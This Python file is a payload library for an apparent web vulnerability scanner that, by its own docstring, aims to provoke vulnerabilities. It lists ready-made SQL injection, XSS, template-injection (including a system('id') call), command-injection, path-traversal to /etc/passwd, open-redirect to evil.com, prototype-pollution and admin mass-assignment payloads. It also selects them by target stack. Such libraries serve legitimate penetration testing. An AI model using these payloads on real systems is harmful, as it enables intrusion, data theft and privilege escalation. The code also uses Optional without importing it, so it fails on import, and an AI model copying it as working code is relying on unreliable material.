"""
ATTACK PAYLOADS - Comprehensive payload library for active exploitation.
These payloads are designed to PROVOKE vulnerabilities, not just detect them.
"""
from typing import List, Dict


class PayloadLibrary:
    """
    Comprehensive payload library for active vulnerability testing.
    Organized by attack category with multiple mutation strategies.
    """

    def __init__(self):
        self.sql_injection = self._load_sql_payloads()
        self.xss = self._load_xss_payloads()
        self.ssti = self._load_ssti_payloads()
        self.command_injection = self._load_command_payloads()
        self.lfi = self._load_lfi_payloads()
        self.auth_bypass = self._load_auth_payloads()
        self.open_redirect = self._load_redirect_payloads()
        self.prototype_pollution = self._load_prototype_payloads()
        self.mass_assignment = self._load_mass_assignment_payloads()

    def _load_sql_payloads(self) -> List[Dict]:
        """SQL Injection payloads - error-based, boolean-based, time-based."""
        return [
            # Error-based (provoke SQL errors)
            {"payload": "'", "category": "sql_injection", "type": "error_based", "confidence": "low"},
            {"payload": "''", "category": "sql_injection", "type": "error_based", "confidence": "low"},
            {"payload": "`", "category": "sql_injection", "type": "error_based", "confidence": "low"},
            {"payload": "\"", "category": "sql_injection", "type": "error_based", "confidence": "low"},
            {"payload": "\\", "category": "sql_injection", "type": "error_based", "confidence": "low"},
            {"payload": "' OR '1'='1", "category": "sql_injection", "type": "boolean_based", "confidence": "medium"},
            {"payload": "' OR '1'='1' --", "category": "sql_injection", "type": "boolean_based", "confidence": "medium"},
            {"payload": "' OR '1'='1' /*", "category": "sql_injection", "type": "boolean_based", "confidence": "medium"},
            {"payload": "' OR 1=1--", "category": "sql_injection", "type": "boolean_based", "confidence": "medium"},
            {"payload": "' OR 1=1#", "category": "sql_injection", "type": "boolean_based", "confidence": "medium"},
            {"payload": "' UNION SELECT NULL--", "category": "sql_injection", "type": "union_based", "confidence": "high"},
            {"payload": "' UNION SELECT NULL,NULL--", "category": "sql_injection", "type": "union_based", "confidence": "high"},
            {"payload": "1' UNION SELECT 1,2,3--", "category": "sql_injection", "type": "union_based", "confidence": "high"},

            # Time-based (blind SQLi)
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "category": "sql_injection", "type": "time_based", "confidence": "high"},
            {"payload": "'; SELECT SLEEP(5)--", "category": "sql_injection", "type": "time_based", "confidence": "high"},
            {"payload": "'; SELECT pg_sleep(5)--", "category": "sql_injection", "type": "time_based", "confidence": "high"},
            {"payload": "1' AND SLEEP(5)--", "category": "sql_injection", "type": "time_based", "confidence": "high"},

            # Error messages
            {"payload": "' AND 1=CONVERT(int, @@version)--", "category": "sql_injection", "type": "error_based", "confidence": "high"},
            {"payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version, 0x7e))--", "category": "sql_injection", "type": "error_based", "confidence": "high"},
        ]

    def _load_xss_payloads(self) -> List[Dict]:
        """XSS payloads - reflected, stored, DOM-based."""
        return [
            # Basic XSS
            {"payload": "<script>alert(1)</script>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<script>alert('XSS')</script>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<img src=x onerror=alert(1)>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<svg onload=alert(1)>", "category": "xss", "type": "reflected", "confidence": "medium"},

            # Encoded XSS
            {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<img src=x onerror=alert(String.fromCharCode(49))>", "category": "xss", "type": "reflected", "confidence": "medium"},

            # DOM-based
            {"payload": "javascript:alert(1)", "category": "xss", "type": "dom_based", "confidence": "medium"},
            {"payload": "<body onload=alert(1)>", "category": "xss", "type": "dom_based", "confidence": "medium"},

            # Event handlers
            {"payload": "<input onfocus=alert(1) autofocus>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<select onfocus=alert(1) autofocus>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<textarea onfocus=alert(1) autofocus>", "category": "xss", "type": "reflected", "confidence": "medium"},

            # Filter evasion
            {"payload": "<ScRiPt>alert(1)</ScRiPt>", "category": "xss", "type": "reflected", "confidence": "low"},
            {"payload": "<script>eval('alert(1)')</script>", "category": "xss", "type": "reflected", "confidence": "medium"},
            {"payload": "<img src=\"x\" onerror=\"alert(1)\">", "category": "xss", "type": "reflected", "confidence": "medium"},
        ]

    def _load_ssti_payloads(self) -> List[Dict]:
        """Server-Side Template Injection payloads."""
        return [
            # Jinja2
            {"payload": "{{7*7}}", "category": "ssti", "type": "jinja2", "confidence": "high", "expected": "49"},
            {"payload": "{{7*'7'}}", "category": "ssti", "type": "jinja2", "confidence": "high", "expected": "7777777"},
            {"payload": "{{config}}", "category": "ssti", "type": "jinja2", "confidence": "high"},
            {"payload": "{{self.__dict__}}", "category": "ssti", "type": "jinja2", "confidence": "high"},

            # Twig
            {"payload": "{{7*7}}", "category": "ssti", "type": "twig", "confidence": "high", "expected": "49"},
            {"payload": "{{_self}}", "category": "ssti", "type": "twig", "confidence": "high"},

            # Handlebars
            {"payload": "{{7*7}}", "category": "ssti", "type": "handlebars", "confidence": "high", "expected": "49"},

            # ERB (Ruby)
            {"payload": "<%= 7*7 %>", "category": "ssti", "type": "erb", "confidence": "high", "expected": "49"},
            {"payload": "<%= system('id') %>", "category": "ssti", "type": "erb", "confidence": "high"},

            # Freemarker
            {"payload": "${7*7}", "category": "ssti", "type": "freemarker", "confidence": "high", "expected": "49"},
        ]

    def _load_command_payloads(self) -> List[Dict]:
        """Command Injection payloads."""
        return [
            # Basic command injection
            {"payload": "; id", "category": "command_injection", "type": "basic", "confidence": "medium"},
            {"payload": "| id", "category": "command_injection", "type": "basic", "confidence": "medium"},
            {"payload": "& id", "category": "command_injection", "type": "basic", "confidence": "medium"},
            {"payload": "&& id", "category": "command_injection", "type": "basic", "confidence": "medium"},
            {"payload": "|| id", "category": "command_injection", "type": "basic", "confidence": "medium"},
            {"payload": "`id`", "category": "command_injection", "type": "basic", "confidence": "medium"},
            {"payload": "$(id)", "category": "command_injection", "type": "basic", "confidence": "medium"},

            # Time-based
            {"payload": "; sleep 5", "category": "command_injection", "type": "time_based", "confidence": "high"},
            {"payload": "| sleep 5", "category": "command_injection", "type": "time_based", "confidence": "high"},
            {"payload": "&& sleep 5", "category": "command_injection", "type": "time_based", "confidence": "high"},

            # Blind command injection
            {"payload": "; ping -c 3 127.0.0.1", "category": "command_injection", "type": "blind", "confidence": "medium"},
            {"payload": "| ping -c 3 127.0.0.1", "category": "command_injection", "type": "blind", "confidence": "medium"},
        ]

    def _load_lfi_payloads(self) -> List[Dict]:
        """Local File Inclusion / Path Traversal payloads."""
        return [
            # Path traversal
            {"payload": "../../../etc/passwd", "category": "lfi", "type": "path_traversal", "confidence": "medium"},
            {"payload": "....//....//....//etc/passwd", "category": "lfi", "type": "path_traversal", "confidence": "medium"},
            {"payload": "..%2F..%2F..%2Fetc%2Fpasswd", "category": "lfi", "type": "path_traversal", "confidence": "medium"},
            {"payload": "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "category": "lfi", "type": "path_traversal", "confidence": "medium"},

            # PHP wrappers
            {"payload": "php://filter/convert.base64-encode/resource=index.php", "category": "lfi", "type": "php_wrapper", "confidence": "high"},
            {"payload": "data://text/plain;base64,PD9waHA=", "category": "lfi", "type": "php_wrapper", "confidence": "high"},

            # Windows paths
            {"payload": "..\\..\\..\\..\\windows\\win.ini", "category": "lfi", "type": "path_traversal", "confidence": "medium"},
        ]

    def _load_auth_payloads(self) -> List[Dict]:
        """Authentication bypass payloads."""
        return [
            {"payload": "", "category": "auth_bypass", "type": "null_token", "confidence": "low"},
            {"payload": "null", "category": "auth_bypass", "type": "null_token", "confidence": "low"},
            {"payload": "undefined", "category": "auth_bypass", "type": "null_token", "confidence": "low"},
            {"payload": "true", "category": "auth_bypass", "type": "boolean_injection", "confidence": "low"},
            {"payload": "1", "category": "auth_bypass", "type": "boolean_injection", "confidence": "low"},
            {"payload": "admin", "category": "auth_bypass", "type": "default_credential", "confidence": "low"},
            {"payload": "administrator", "category": "auth_bypass", "type": "default_credential", "confidence": "low"},
        ]

    def _load_redirect_payloads(self) -> List[Dict]:
        """Open redirect payloads."""
        return [
            {"payload": "http://evil.com", "category": "open_redirect", "type": "basic", "confidence": "medium"},
            {"payload": "//evil.com", "category": "open_redirect", "type": "protocol_relative", "confidence": "medium"},
            {"payload": "javascript:alert(1)", "category": "open_redirect", "type": "javascript", "confidence": "high"},
            {"payload": "/\\evil.com", "category": "open_redirect", "type": "encoded", "confidence": "medium"},
        ]

    def _load_prototype_payloads(self) -> List[Dict]:
        """Prototype pollution payloads."""
        return [
            {"payload": '{"__proto__":{"isAdmin":true}}', "category": "prototype_pollution", "type": "basic", "confidence": "medium"},
            {"payload": '{"constructor":{"prototype":{"isAdmin":true}}}', "category": "prototype_pollution", "type": "constructor", "confidence": "medium"},
        ]

    def _load_mass_assignment_payloads(self) -> List[Dict]:
        """Mass assignment payloads."""
        return [
            {"payload": '{"admin":true,"role":"admin"}', "category": "mass_assignment", "type": "admin_privilege", "confidence": "medium"},
            {"payload": '{"is_admin":true}', "category": "mass_assignment", "type": "admin_privilege", "confidence": "medium"},
            {"payload": '{"role":"administrator"}', "category": "mass_assignment", "type": "role_escalation", "confidence": "medium"},
        ]

    def get_all_payloads(self, attack_mode: str = "aggressive", tech_stack: Optional[List[str]] = None) -> List[Dict]:
        """
        Get all payloads based on attack mode and optional technology stack.

        Args:
            attack_mode: passive, active, or aggressive
            tech_stack: Optional list of detected technologies (e.g., ['php', 'windows', 'linux'])

        Returns:
            List of payload dictionaries
        """
        all_payloads = []

        if attack_mode == "passive":
            # Minimal payloads for passive mode
            return []

        # Categories to include
        categories = [
            "sql_injection", "xss", "ssti", "command_injection",
            "lfi", "auth_bypass", "open_redirect", "prototype_pollution",
            "mass_assignment"
        ]

        for cat in categories:
            payloads = self.get_payloads_by_category(cat)

            # Filter by tech stack if provided
            if tech_stack:
                payloads = self._filter_by_tech(payloads, tech_stack)

            if attack_mode == "active":
                # Limit payloads in active mode
                all_payloads.extend(payloads[:5])
            else: # aggressive
                all_payloads.extend(payloads)

        return all_payloads

    def _filter_by_tech(self, payloads: List[Dict], tech_stack: List[str]) -> List[Dict]:
        """Filter payloads based on detected technology."""
        filtered = []
        tech_stack_lower = [t.lower() for t in tech_stack]

        is_windows = any(t in tech_stack_lower for t in ['windows', 'iis', 'asp.net'])
        is_linux = any(t in tech_stack_lower for t in ['linux', 'unix', 'ubuntu', 'debian'])
        is_php = any(t in tech_stack_lower for t in ['php', 'apache', 'laravel'])

        for p in payloads:
            payload_str = p['payload'].lower()

            # OS filtering
            if is_windows and not is_linux:
                if "/etc/passwd" in payload_str or " id" in payload_str:
                    continue
            if is_linux and not is_windows:
                if "windows\\" in payload_str or "win.ini" in payload_str:
                    continue

            # Language filtering
            if is_php:
                # Keep PHP specific payloads
                pass
            elif any(t in tech_stack_lower for t in ['python', 'django', 'flask']):
                if "php://" in payload_str:
                    continue

            filtered.append(p)

        return filtered

    def get_payloads_by_category(self, category: str) -> List[Dict]:
        """Get payloads for a specific category."""
        category_map = {
            "sql_injection": self.sql_injection,
            "xss": self.xss,
            "ssti": self.ssti,
            "command_injection": self.command_injection,
            "lfi": self.lfi,
            "auth_bypass": self.auth_bypass,
            "open_redirect": self.open_redirect,
            "prototype_pollution": self.prototype_pollution,
            "mass_assignment": self.mass_assignment,
        }
        return category_map.get(category, [])
